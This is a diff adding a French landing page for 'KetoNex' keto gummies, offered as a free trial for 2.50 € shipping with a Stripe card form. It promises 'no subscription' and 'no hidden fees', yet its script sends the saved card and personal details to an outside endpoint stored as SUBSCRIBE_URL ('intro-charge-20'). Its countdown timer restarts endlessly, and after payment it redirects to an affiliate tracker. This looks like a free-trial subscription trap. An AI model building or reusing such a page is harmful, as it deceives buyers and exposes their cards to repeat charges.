@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="fr-FR">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>KetoNex • Gummies Keto BHB + ACV — Essai Gratuit (FR)</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800;900&display=swap" rel="stylesheet"/>
+<style>
+  :root{
+    --brand:#6f2ddf;
+    --brand-2:#e11d2a;
+    --accent:#22a559;
+    --ink:#0b1220;
+    --muted:#5b6472;
+    --line:#e5e7eb;
+    --radius:18px;
+    --product-bg:#F2F2F2;
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0;
+    font:16px/1.5 Inter,system-ui,-apple-system,"Segoe UI",Roboto,Arial;
+    color:var(--ink);
+    background: radial-gradient(1200px 600px at 10% -10%, #f3ecff 0%, #ffffff 55%, #fff2f0 100%);
+  }
+
+  .sparkles{position:absolute;inset:0;pointer-events:none;overflow:hidden}
+  .sparkles i{position:absolute;width:6px;height:6px;border-radius:50%;background:rgba(255,255,255,.9);box-shadow:0 0 20px rgba(111,45,223,.45),0 0 8px rgba(225,29,42,.35);animation:float 8s linear infinite}
+  .sparkles i:nth-child(2){width:8px;height:8px;animation-duration:10s;left:15%}
+  .sparkles i:nth-child(3){width:5px;height:5px;animation-duration:12s;left:70%}
+  .sparkles i:nth-child(4){width:7px;height:7px;animation-duration:9s;left:85%}
+  @keyframes float{0%{transform:translateY(120%)}100%{transform:translateY(-20%)}}
+
+  .ribbon{background:linear-gradient(90deg,var(--brand),#a67bf6);color:#fff;font-weight:900;text-transform:uppercase;letter-spacing:.3px;position:relative;z-index:2}
+  .ribbon .wrap{display:flex;align-items:center;gap:14px;padding:10px 16px;max-width:1200px;margin:0 auto}
+  .pill{background:rgba(255,255,255,.18);padding:5px 12px;border-radius:999px;border:1px solid rgba(255,255,255,.45)}
+  .timer{margin-left:auto;display:flex;gap:18px;font-weight:900}
+  .timer span{display:flex;gap:6px;align-items:center}
+
+  .hero{position:relative;border-bottom:1px solid var(--line);}
+  .hero .wrap{max-width:1200px;margin:0 auto;padding:34px 16px;display:grid;grid-template-columns:1.15fr 1fr;gap:28px;align-items:center}
+  .brand{display:flex;align-items:center;gap:12px;font-weight:900;font-size:40px;letter-spacing:.2px}
+  .logoDot{width:30px;height:30px;border-radius:50%;background:var(--brand);position:relative;box-shadow:0 10px 30px rgba(111,45,223,.25)}
+  .logoDot:after{content:"";position:absolute;inset:6px 10px 6px 6px;border-radius:46% 14% 46% 46%/46% 14% 46% 46%;background:#fff;transform:rotate(-35deg)}
+  .hero h1{font-size:38px;margin:14px 0 10px}
+  .sub{font-size:18px;color:#2b3340}
+  .badges{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-top:16px}
+  .badge{background:#fff;border:1px solid var(--line);border-radius:14px;padding:14px;text-align:center;box-shadow:0 8px 26px rgba(111,45,223,.08)}
+  .badge b{display:block;margin-top:6px}
+  .product-hero{min-height:300px;border-radius:22px;border:1px solid var(--line);background:var(--product-bg) url('keto.jpg') center/contain no-repeat;box-shadow:0 18px 50px rgba(111,45,223,.10)}
+
+  .flash{margin-top:16px;display:flex;align-items:center;gap:12px;padding:10px 14px;border-radius:12px;background:linear-gradient(90deg,rgba(111,45,223,.12),rgba(225,29,42,.12));backdrop-filter:saturate(140%)}
+  .flash strong{color:var(--brand)}
+
+  .main{max-width:1200px;margin:0 auto;padding:24px 16px;display:grid;grid-template-columns:1fr 420px;gap:24px}
+  @media (max-width:1000px){.hero .wrap{grid-template-columns:1fr}.main{grid-template-columns:1fr}}
+
+  .card{background:#fff;border:1px solid var(--line);border-radius:var(--radius);box-shadow:0 8px 24px rgba(2,18,8,.06)}
+  .card .pad{padding:18px}
+
+  .offer{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+  @media (max-width:720px){.offer{grid-template-columns:1fr}}
+  .tile{border:2px solid var(--line);border-radius:16px;padding:16px;position:relative}
+  .tile.pop{border-color:var(--brand);box-shadow:0 0 0 4px rgba(111,45,223,.14)}
+  .tile h4{margin:2px 0 6px}
+  .price{font-size:28px;font-weight:900;color:var(--accent)}
+  .strike{color:#96a0ad;text-decoration:line-through;font-weight:700}
+  .rtag{position:absolute;top:12px;left:12px;background:var(--brand-2);color:#fff;font-size:12px;padding:5px 10px;border-radius:999px}
+
+  .checkout .head{display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--line);padding:14px 18px}
+  .checkout h3{margin:0;font-size:20px}
+  .row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+  .row > *{min-width:0}
+
+  .phone{display:flex;gap:10px;width:100%}
+  .phone select{flex:0 0 170px}
+  .phone input{flex:1 1 0%;min-width:0;width:100%}
+
+  .input,.el,select{width:100%;display:block;padding:12px 14px;border:1.6px solid var(--line);border-radius:12px;background:#fff;color:#000}
+  .input:focus,.el:focus,select:focus{outline:none;border-color:#e8dcff;box-shadow:0 0 0 3px rgba(111,45,223,.18)}
+
+  .paybtn{width:100%;padding:16px 18px;border-radius:14px;background:linear-gradient(180deg,var(--brand),#4e1ca5);color:#fff;font-weight:900;border:none;cursor:pointer;box-shadow:0 14px 30px rgba(111,45,223,.25)}
+  .paybtn:hover{filter:saturate(1.06) brightness(0.98)}
+  .muted{color:var(--muted);font-size:14px}
+  .trust{display:flex;gap:14px;justify-content:center;padding:12px;border-top:1px solid var(--line)}
+  .trust img{height:22px;opacity:.85}
+
+  .list{display:grid;gap:10px;margin-top:6px}
+  .list .li{display:flex;gap:10px}
+  .check{width:18px;height:18px;border-radius:4px;background:#efe7ff;display:inline-flex;align-items:center;justify-content:center}
+  .check:after{content:"✓";font-size:12px;color:#6f2ddf}
+
+  .notice{border:1px dashed #e6d7ff;background:#fbf8ff;color:#3e2b67;padding:10px 12px;border-radius:12px}
+
+  details{border:1px solid var(--line);border-radius:12px;padding:12px 14px}
+  details+details{margin-top:10px}
+  summary{cursor:pointer;font-weight:700}
+
+  .overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);display:none;align-items:center;justify-content:center;z-index:100}
+  .overlay[aria-hidden="false"]{display:flex}
+  .box{background:#fff;border-radius:16px;max-width:520px;width:92vw;padding:22px;text-align:center;box-shadow:0 10px 28px rgba(0,0,0,.3)}
+  .bar{height:10px;width:100%;background:#eef2f5;border-radius:999px;overflow:hidden;margin-top:10px}
+  .bar span{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--brand),#bca7ff);animation:load 2.2s ease-in-out infinite;border-radius:inherit}
+  @keyframes load{0%{width:0%}60%{width:85%}100%{width:100%}}
+
+  #err{margin-top:10px;font-size:14px;color:#b00020;background:#fde9eb;border:1px solid #e5b2b8;border-radius:10px;padding:8px;display:none}
+  #err[aria-hidden="false"]{display:block}
+
+  footer{padding:30px 16px;color:#3b4450;border-top:1px solid var(--line);text-align:center}
+</style>
+</head>
+<body>
+  <div class="ribbon">
+    <div class="wrap">
+      <div><span class="pill">Offre d’essai gratuite</span> Votre première boîte est offerte</div>
+      <div class="timer" aria-live="polite">
+        <span><strong id="hh">00</strong> H</span>
+        <span><strong id="mm">15</strong> Min</span>
+        <span><strong id="ss">00</strong> Sec</span>
+      </div>
+    </div>
+  </div>
+
+  <section class="hero">
+    <div class="sparkles" aria-hidden="true">
+      <i style="left:5%"></i><i></i><i></i><i></i>
+    </div>
+    <div class="wrap">
+      <div>
+        <div class="brand"><span class="logoDot"></span> KetoNex</div>
+        <h1>Gummies Keto BHB + ACV — Bouteille d’Essai Gratuite*</h1>
+        <p class="sub">Payez seulement <b>2,50 €</b> de frais d’expédition. <b>Pas de frais cachés.</b> Sans abonnement. Essayez, ressentez la différence et revenez quand vous serez convaincu.</p>
+        <div class="flash"><strong>Ce que cela soutient :</strong> cétose & métabolisme des graisses, contrôle de l’appétit, énergie stable et gestion saine du poids.</div>
+        <div class="badges">
+          <div class="badge">🔥 <b>Soutient la cétose</b></div>
+          <div class="badge">⚖️ <b>Gestion du poids</b></div>
+          <div class="badge">🍎 <b>Bienfaits du vinaigre de cidre</b></div>
+          <div class="badge">⚡ <b>Énergie propre</b></div>
+        </div>
+      </div>
+      <div class="product-hero" role="img" aria-label="Bouteille KetoNex Keto BHB + ACV Gummies"></div>
+    </div>
+  </section>
+
+  <section class="main">
+    <div class="card">
+      <div class="pad">
+        <div class="offer">
+          <div class="tile pop">
+            <span class="rtag">Votre essai gratuit</span>
+            <h4>1× KetoNex Keto BHB + ACV Gummies (30 gummies)</h4>
+            <div class="strike">39,95 €</div>
+            <div class="price">0,00 € aujourd’hui</div>
+            <p class="muted">Seulement <b>2,50 €</b> de frais de port à la caisse — c’est tout.</p>
+          </div>
+          <div class="tile">
+            <h4>Pourquoi cette offre ?</h4>
+            <p>Nous croyons en notre formule. Essayez une bouteille taille réelle pour le coût de l’expédition. Aucun frais récurrent ni frais caché — jamais.</p>
+          </div>
+          <div class="tile">
+            <h4>Promesse de transparence</h4>
+            <div class="list">
+              <div class="li"><span class="check"></span><div><b>Paiement unique</b> de 2,50 € pour l’expédition</div></div>
+              <div class="li"><span class="check"></span><div><b>Aucun abonnement</b> ajouté à votre commande</div></div>
+              <div class="li"><span class="check"></span><div><b>Satisfait sous 30 jours</b> ou remboursement des frais de port</div></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card" style="margin-top:14px">
+          <div class="pad">
+            <h3>Comment KetoNex agit (bref scientifique)</h3>
+            <div class="list">
+              <div class="li"><span class="check"></span><div><b>Base du régime cétogène :</b> en réduisant les glucides, l’organisme passe en <i>cétose</i> et utilise la graisse comme carburant en produisant des corps cétoniques.*</div></div>
+              <div class="li"><span class="check"></span><div><b>Cétones exogènes BHB :</b> le bêta-hydroxybutyrate apporte des <i>cétones prêtes à l’emploi</i> qui soutiennent l’entrée en cétose, le métabolisme lipidique et la clarté mentale.*</div></div>
+              <div class="li"><span class="check"></span><div><b>ACV (acide acétique) :</b> associé au soutien de la <i>réponse glycémique post-repas</i> et de la satiété — utile pour gérer l’appétit dans les plans pauvres en glucides.*</div></div>
+              <div class="li"><span class="check"></span><div><b>La constance compte :</b> des gummies savoureux facilitent la prise quotidienne — à associer à une alimentation équilibrée et au mouvement.</div></div>
+            </div>
+            <p class="notice" role="note">*Ces indications concernent le bien-être général et n’ont pas été évaluées par une autorité sanitaire. Ce produit n’est pas destiné à diagnostiquer, traiter, guérir ou prévenir une maladie. Les résultats varient selon les individus.</p>
+          </div>
+        </div>
+
+        <div class="card" style="margin-top:14px">
+          <div class="pad">
+            <h3>FAQ</h3>
+            <details>
+              <summary>Est-ce vraiment gratuit ?</summary>
+              <p>Oui. Votre première bouteille est offerte. Vous payez uniquement un <b>frais d’expédition unique de 2,50 €</b>. <b>Aucun</b> frais caché et <b>aucun</b> programme d’auto-livraison.</p>
+            </details>
+            <details>
+              <summary>Comment les prendre ?</summary>
+              <p>Prenez 2 gummies par jour. Beaucoup les apprécient l’après-midi ou avant l’entraînement.</p>
+            </details>
+            <details>
+              <summary>Dois-je suivre un régime céto strict ?</summary>
+              <p>Non. KetoNex peut s’utiliser avec une alimentation plus pauvre en glucides. Les meilleurs résultats viennent d’une utilisation régulière et d’habitudes alimentaires équilibrées.</p>
+            </details>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Paiement -->
+    <div class="card checkout" id="checkoutCard">
+      <div class="head">
+        <h3>Obtenir ma bouteille gratuite</h3>
+        <div class="muted">Paiement sécurisé</div>
+      </div>
+      <div class="pad">
+        <div class="row" style="margin-bottom:8px">
+          <input id="emailInput" class="input" type="email" placeholder="Adresse e-mail"/>
+          <input id="nameInput" class="input" placeholder="Nom complet"/>
+        </div>
+        <div style="margin-bottom:8px">
+          <div class="phone">
+            <!-- FR SEULEMENT -->
+            <select id="phonePrefix" class="input" aria-label="Indicatif téléphonique">
+              <option value="+33" selected>+33 — France</option>
+            </select>
+            <input id="phoneNumber" class="input" type="tel" inputmode="tel" placeholder="Numéro de téléphone"/>
+          </div>
+        </div>
+        <div class="row" style="margin-bottom:8px">
+          <input id="billingStreet" class="input" placeholder="Adresse (ligne 1)"/>
+          <input id="billingCity" class="input" placeholder="Ville"/>
+        </div>
+        <div class="row" style="margin-bottom:8px">
+          <input id="billingPostcode" class="input" placeholder="Code postal"/>
+          <!-- FR SEULEMENT -->
+          <select id="billingCountry" class="input">
+            <option value="FR" selected>France</option>
+          </select>
+        </div>
+
+        <div class="muted" style="margin:8px 0 4px">Numéro de carte (pour 2,50 € d’expédition)</div>
+        <div id="card-number" class="el"></div>
+        <div class="row" style="margin-top:8px">
+          <div>
+            <div class="muted" style="margin:8px 0 4px">Expiration</div>
+            <div id="card-expiry" class="el"></div>
+          </div>
+          <div>
+            <div class="muted" style="margin:8px 0 4px">CVC</div>
+            <div id="card-cvc" class="el"></div>
+          </div>
+        </div>
+
+        <div class="notice" style="margin-top:10px">
+          <b>Aucun frais caché.</b> Vous ne serez débité que de <b>2,50 €</b> aujourd’hui pour l’expédition.
+        </div>
+
+        <div id="err" role="alert" aria-hidden="true"></div>
+
+        <button id="payNow" class="paybtn" style="margin-top:12px">Obtenir ma bouteille gratuite</button>
+        <p class="muted" style="margin:10px 0 0">🔒 Paiement sécurisé 256-bit SSL</p>
+      </div>
+      <div class="trust">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa"/>
+        <img src="https://charmr.xyz/logos/mc2.png" alt="Mastercard"/>
+        <img src="https://charmr.xyz/logos/amex.png" alt="Amex"/>
+        <img src="https://www.gstatic.com/instantbuy/svg/dark_gpay.svg" alt="GPay"/>
+      </div>
+    </div>
+  </section>
+
+  <div id="overlay" class="overlay" aria-hidden="true">
+    <div class="box">
+      <h3>Traitement en cours…</h3>
+      <div class="bar"><span></span></div>
+      <p class="muted">Veuillez patienter quelques secondes.</p>
+    </div>
+  </div>
+
+  <footer>
+    <b>Avis important :</b> Ces déclarations n’ont pas été évaluées par une autorité sanitaire. KetoNex n’est pas destiné à diagnostiquer, traiter, guérir ou prévenir une maladie. Demandez conseil à un professionnel de santé en cas de pathologie ou de prise de médicaments.
+  </footer>
+
+  <!-- Stripe.js -->
+  <script src="https://js.stripe.com/v3"></script>
+  <script>
+    /* Compte à rebours */
+    (function countdownLoop(){
+      const hh=document.getElementById('hh'), mm=document.getElementById('mm'), ss=document.getElementById('ss');
+      const DURATION_MS = 15*60*1000;
+      let end = Date.now() + DURATION_MS;
+      const fmt=n=>String(n).padStart(2,'0');
+      (function tick(){
+        const left = Math.max(0, end - Date.now());
+        const s = Math.floor(left/1000)%60;
+        const m = Math.floor(left/60000)%60;
+        const h = Math.floor(left/3600000);
+        hh.textContent=fmt(h); mm.textContent=fmt(m); ss.textContent=fmt(s);
+        if(left<=0){ end = Date.now() + DURATION_MS; }
+        requestAnimationFrame(tick);
+      })();
+    })();
+
+    /* FR uniquement (préfixe/pays déjà fixés dans le HTML) */
+    const ALLOWED = { FR: { prefix: '+33', name: 'France' } };
+
+    /* Endpoint (identique aux autres pages) */
+    const SUBSCRIBE_URL = "https://charmr-jfmc.onrender.com/api/stripe/intro-charge-20";
+
+    const PUBLISHABLE_KEY = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
+    const stripe = Stripe(PUBLISHABLE_KEY);
+    const elements = stripe.elements();
+    const cardNumber=elements.create("cardNumber");
+    const cardExpiry=elements.create("cardExpiry");
+    const cardCvc=elements.create("cardCvc");
+    cardNumber.mount("#card-number"); cardExpiry.mount("#card-expiry"); cardCvc.mount("#card-cvc");
+
+    const $err=document.getElementById("err");
+    const overlay=document.getElementById('overlay');
+    const showError=m=>{$err.textContent=m;$err.setAttribute('aria-hidden','false');}
+    const hideError=()=>{$err.textContent="";$err.setAttribute('aria-hidden','true');}
+    const showLoading=()=>overlay.setAttribute('aria-hidden','false');
+    const hideLoading=()=>overlay.setAttribute('aria-hidden','true');
+
+    const nameInput=document.getElementById('nameInput');
+    const emailInput=document.getElementById('emailInput');
+    const phoneNumber=document.getElementById('phoneNumber');
+    const billingStreet=document.getElementById('billingStreet');
+    const billingCity=document.getElementById('billingCity');
+    const billingPostcode=document.getElementById('billingPostcode');
+
+    document.getElementById("payNow").onclick = async () => {
+      hideError(); showLoading();
+      const rawPhone=(phoneNumber?.value||'').replace(/[^\d]/g,'');
+      const fullPhone = rawPhone ? `+33${rawPhone}` : undefined;
+
+      const addr = {
+        line1:(billingStreet?.value||'').trim()||undefined,
+        city:(billingCity?.value||'').trim()||undefined,
+        postal_code:(billingPostcode?.value||'').trim()||undefined,
+        country:'FR'
+      };
+
+      const pm = await stripe.createPaymentMethod({
+        type:"card",
+        card:cardNumber,
+        billing_details:{
+          name:nameInput.value||undefined,
+          email:emailInput.value||undefined,
+          phone:fullPhone,
+          address:addr
+        }
+      });
+      if(pm.error){ hideLoading(); showError(pm.error.message); return; }
+
+      try{
+        const res = await fetch(SUBSCRIBE_URL,{
+          method:"POST",
+          headers:{"Content-Type":"application/json"},
+          body:JSON.stringify({
+            paymentMethodId:pm.paymentMethod.id,
+            name:nameInput.value,
+            email:emailInput.value,
+            phone:fullPhone,
+            address:addr,
+            amount:250 // 2,50 € (en centimes)
+          })
+        });
+        const data = await res.json();
+        if(data.error){ hideLoading(); showError(data.error); return; }
+        if(!data.clientSecret){ hideLoading(); showError("Paiement échoué"); return; }
+
+        const conf = await stripe.confirmCardPayment(data.clientSecret);
+        if(conf.error){ hideLoading(); showError(conf.error.message); return; }
+        if(!(conf.paymentIntent && conf.paymentIntent.status === "succeeded")){
+          hideLoading(); showError("Paiement non finalisé"); return;
+        }
+
+        window.location.href = "https://cudsr.bemobtrcks.com/go/abc281a7-e82a-411b-8b56-1a0228d7d2e7?";
+      }catch(e){ hideLoading(); showError(e.message||"Une erreur est survenue"); }
+    };
+  </script>
+
+  <!-- GoAffPro loader (tracking) -->
+  <script type="text/javascript" src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>
+</body>
+</html>
